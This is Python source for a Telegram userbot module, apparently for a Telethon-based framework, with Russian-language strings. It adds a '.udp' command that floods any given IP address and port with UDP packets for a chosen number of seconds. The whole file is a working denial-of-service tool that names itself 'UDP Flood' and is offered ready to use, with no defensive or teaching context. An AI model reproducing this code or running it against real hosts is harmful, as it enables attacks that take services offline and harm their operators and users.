from telethon.tl.types import Message
from .. import loader, utils
import socket
import asyncio

@loader.tds
class UdpFloodModule(loader.Module):
    """Модуль для отправки UDP пакетов"""

    strings = {
        "name": "UDP Flood",
        "usage": "<b>Использование:</b> .udp <ip> <port> <sec>",
        "start": "<b>🚀 Начинаем отправку пакетов на {}:{} на {} секунд...</b>",
        "complete": "<b>✅ Отправка пакетов завершена.</b>",
        "error": "<b>Ошибка:</b> Некорректные аргументы."
    }

    async def client_ready(self, client, db):
        self.client = client

    async def udpcmd(self, message: Message):
        """[ip] [port] [sec] - Отправляет UDP пакеты на указанный IP и порт на заданное количество секунд"""
        args = utils.get_args_raw(message)
        if len(args.split()) != 3:
            await utils.answer(message, self.strings("usage"))
            return

        ip, port, sec = args.split()
        try:
            port = int(port)
            sec = int(sec)
        except ValueError:
            await utils.answer(message, self.strings("error"))
            return

        await utils.answer(message, self.strings("start").format(ip, port, sec))
        await self.udp_flood(ip, port, sec)
        await utils.answer(message, self.strings("complete"))

    async def udp_flood(self, ip, port, duration):
        """ Функция для отправки UDP пакетов """
        start_time = asyncio.get_event_loop().time()
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            while True:
                if (asyncio.get_event_loop().time() - start_time) > duration:
                    break
                try:
                    sock.sendto(b'RandomData', (ip, port))
                except Exception as e:
                    print(f"Ошибка отправки: {e}")

# Пример создания и использования модуля
module = UdpFloodModule()
